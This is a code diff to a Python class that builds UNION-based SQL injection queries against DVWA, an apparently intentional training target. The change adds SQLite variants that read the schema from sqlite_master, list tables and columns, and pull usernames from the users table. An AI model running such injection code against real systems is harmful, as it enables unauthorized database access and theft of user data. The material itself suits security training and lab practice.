@@ -142,27 +142,35 @@ class Union:
 		if self.mysql:
 			self.exec_union("DATABASE()", "")
 		else:
-			self.exec_union("DATABASE()", "")
+			self.exec_union("sql", " FROM sqlite_schema")
 
 	def get_table_names(self):
 		if self.mysql:
+			column_name = "table_name"
 			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
 		else:
-			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
-		self.exec_union("table_name", contents)
+			column_name = "tbl_name"
+			contents = " FROM sqlite_master WHERE name='users'"
+		self.exec_union(column_name, contents)
 
 	def get_column_names(self):
 		if self.mysql:
+			column_name = "column_name"
 			contents = " FROM information_schema.columns WHERE table_name = 'users'"
 		else:
-		self.exec_union("column_name", contents)
+			column_name = "sql"
+			contents = " FROM sqlite_master WHERE name='users'"
+		self.exec_union(column_name, contents)
 
 	def get_all_data(self):
 		# not correct
 		if self.mysql:
+			column_name = "table_name"
 			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
 		else:
-		self.exec_union("table_name", contents)
+			column_name = "username"
+			contents = " FROM users"
+		self.exec_union(column_name, contents)
 
 	def union(self):
 		try:
